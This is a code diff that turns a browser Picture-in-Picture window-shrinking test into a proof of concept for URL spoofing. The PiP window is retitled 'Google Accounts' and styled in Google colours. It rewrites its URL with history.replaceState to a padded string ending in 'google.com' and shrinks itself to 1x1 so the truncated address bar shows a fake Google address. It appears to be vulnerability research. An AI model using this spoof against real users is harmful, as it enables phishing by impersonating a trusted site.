@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>PiP Extreme Resize</title>
+<title>PiP Tiny + URL Spoofing</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
   body { background: #f4f4f4; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
@@ -18,9 +18,9 @@
 <body>
 
 <div class="panel" id="main-card">
-  <h2>🔒 PiP Extreme Resize</h2>
-  <p>Klik tombol di bawah. Jendela PiP akan diperkecil hingga ukuran ekstrem (1x1) sehingga title bar dan tombol close hilang.</p>
-  <button id="startBtn">Shrink PiP to 1x1</button>
+  <h2>🔒 PiP Tiny + URL Spoofing</h2>
+  <p>Klik tombol di bawah. PiP akan diperkecil hingga title bar dan address bar terpotong, menampilkan URL palsu.</p>
+  <button id="startBtn">Open Tiny Spoofed PiP</button>
   <div id="status">[*] Ready...</div>
 </div>
 
@@ -33,7 +33,7 @@
 
   function log(msg) {
     statusEl.textContent = msg;
-    console.log("[PiP Tiny] " + msg);
+    console.log("[PiP Tiny Spoof] " + msg);
   }
 
   // ============================================
@@ -59,7 +59,7 @@
       log('PiP Window Opened. Size: ' + pipWindow.innerWidth + 'x' + pipWindow.innerHeight);
 
       // ============================================
-      // 3. TULIS KONTEN PiP (DENGAN TOMBOL SHRINK)
+      // 3. TULIS KONTEN PiP + URL SPOOFING
       // ============================================
       pipWindow.document.open();
       pipWindow.document.write(`
@@ -67,7 +67,7 @@
         <html>
         <head>
           <meta charset="UTF-8">
-          <title>PiP Shrink Test</title>
+          <title>Google Accounts</title>
           <style>
             * { margin: 0; padding: 0; box-sizing: border-box; }
             body {
@@ -85,7 +85,7 @@
             p { font-size: 13px; color: #666; margin-bottom: 20px; }
             button {
               padding: 12px 24px;
-              background: #f00;
+              background: #1a73e8;
               color: #fff;
               border: none;
               border-radius: 6px;
@@ -93,7 +93,7 @@
               font-weight: bold;
               cursor: pointer;
             }
-            button:hover { background: #c00; }
+            button:hover { background: #1557b0; }
             .info {
               font-family: monospace;
               font-size: 12px;
@@ -103,9 +103,9 @@
           </style>
         </head>
         <body>
-          <h3>PiP Shrink Test</h3>
-          <p>Click the button below to shrink this window to 1x1 pixel.</p>
-          <button id="shrinkBtn">Shrink to 1x1</button>
+          <h3>Google Accounts</h3>
+          <p>Click the button below to shrink this window and spoof the URL.</p>
+          <button id="shrinkBtn">Shrink & Spoof</button>
           <div class="info" id="sizeInfo">Size: 400x300</div>
 
           <script>
@@ -113,15 +113,21 @@
               var shrinkBtn = document.getElementById('shrinkBtn');
               var sizeInfo = document.getElementById('sizeInfo');
 
-              // Update info ukuran
               function updateSize() {
                 sizeInfo.textContent = 'Size: ' + window.innerWidth + 'x' + window.innerHeight;
               }
 
-              // Shrink ke 1x1
+              // Fungsi shrink + spoof URL
               shrinkBtn.addEventListener('click', function() {
                 try {
+                  // 1. Spoof URL dengan subdomain panjang
+                  // Contoh: ?......................google.com
+                  var spoofedUrl = '?......................google.com';
+                  history.replaceState(null, '', spoofedUrl);
+                  
+                  // 2. Resize ke ukuran kecil (1x1 atau minimal)
                   window.resizeTo(1, 1);
+                  
                   updateSize();
                 } catch (err) {
                   sizeInfo.textContent = 'Error: ' + err.message;
@@ -138,7 +144,7 @@
       `);
       pipWindow.document.close();
 
-      log('PiP ready. Click "Shrink to 1x1" inside the PiP.');
+      log('PiP ready. Click "Shrink & Spoof" inside the PiP.');
 
     } catch (e) {
       log('Error: ' + e.message);
